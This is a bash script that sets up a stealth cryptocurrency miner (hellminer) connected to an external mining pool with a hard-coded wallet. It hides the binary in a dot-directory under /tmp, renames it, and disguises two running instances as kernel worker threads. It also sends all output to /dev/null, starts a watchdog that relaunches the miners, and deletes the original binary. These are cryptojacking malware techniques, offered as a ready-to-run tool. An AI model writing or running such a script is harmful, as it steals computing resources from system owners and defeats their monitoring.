#!/bin/bash
# Hellminer EU Pool Stealth Setup

echo "=== Hellminer EU Pool Setup ==="

# Configuration
WALLET="RVMo7fjYHfWrPbEEPP4PYc2ZLeh55Zy5dq"  # Your wallet
POOL="stratum+tcp://eu.luckpool.net:3956"    # EU pool only
WORKER="linux$(hostname | cut -c1-4)"        # Worker name

# Create hidden directory
WORKDIR="/tmp/.system_cache"
echo "Creating directory: $WORKDIR"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

# Check for hellminer
echo "Looking for hellminer..."
if [ -f "/home/ubuntu/vs-mn/hellminer" ]; then
    cp "/home/ubuntu/vs-mn/hellminer" ./sys_kworker
    chmod +x ./sys_kworker
    echo "✓ hellminer found and copied"
else
    echo "✗ ERROR: hellminer not found at /home/ubuntu/vs-mn/hellminer"
    exit 1
fi

# Start hellminer with EU pool
echo "Starting hellminer (EU pool)..."
nohup bash -c "exec -a [kworker/eu0] ./sys_kworker -c stratum+tcp://eu.luckpool.net:3956 -u $WALLET.$WORKER -p x --cpu 1" > /dev/null 2>&1 &
PID1=$!
echo "✓ hellminer started (PID: $PID1, disguised as [kworker/eu0])"

# Start second instance with different worker name (optional)
echo "Starting second instance..."
nohup bash -c "exec -a [kworker/eu1] ./sys_kworker -c stratum+tcp://eu.luckpool.net:3956 -u $WALLET.worker2 -p x --cpu 1" > /dev/null 2>&1 &
PID2=$!
echo "✓ second instance started (PID: $PID2, disguised as [kworker/eu1])"

# Create restart monitor
echo "Creating restart monitor..."
cat > restart.sh << 'EOF'
#!/bin/bash
cd "$(dirname "$0")"

while true; do
    sleep 300  # Check every 5 minutes
    
    # Check first instance
    if ! pgrep -f "\[kworker/eu0\]" > /dev/null 2>&1; then
        echo "$(date): Restarting hellminer instance 1" >> monitor.log
        nohup bash -c "exec -a [kworker/eu0] ./sys_kworker -c stratum+tcp://eu.luckpool.net:3956 -u WALLET_ADDRESS.WORKER_NAME -p x --cpu 1" > /dev/null 2>&1 &
    fi
    
    # Check second instance
    if ! pgrep -f "\[kworker/eu1\]" > /dev/null 2>&1; then
        echo "$(date): Restarting hellminer instance 2" >> monitor.log
        nohup bash -c "exec -a [kworker/eu1] ./sys_kworker -c stratum+tcp://eu.luckpool.net:3956 -u WALLET_ADDRESS.worker2 -p x --cpu 1" > /dev/null 2>&1 &
    fi
    
    # Clean old logs weekly
    if [ $(date +%u) -eq 1 ]; then  # Monday
        find . -name "*.log" -mtime +7 -delete 2>/dev/null
    fi
done
EOF

# Replace variables
sed -i "s|WALLET_ADDRESS|$WALLET|g" restart.sh
sed -i "s|WORKER_NAME|$WORKER|g" restart.sh

chmod +x restart.sh
nohup ./restart.sh > /dev/null 2>&1 &
echo "✓ Restart monitor started"

# Remove original file
echo "Cleaning up..."
rm -f /home/ubuntu/vs-mn/hellminer 2>/dev/null && echo "✓ Original hellminer removed"

echo ""
echo "=== SETUP COMPLETE ==="
echo ""
echo "Hellminer is now running with EU pool:"
echo "  Pool: eu.luckpool.net:3956"
echo "  Wallet 1: $WALLET.$WORKER"
echo "  Wallet 2: $WALLET.worker2"
echo "  CPU threads: 1 each"
echo ""
echo "Working directory: $WORKDIR"
echo ""
echo "To check if running:"
echo "  ps aux | grep 'kworker/eu' | grep -v grep"
echo ""
echo "To stop everything:"
echo "  pkill -f 'kworker/eu'"
echo "  pkill -f restart.sh"
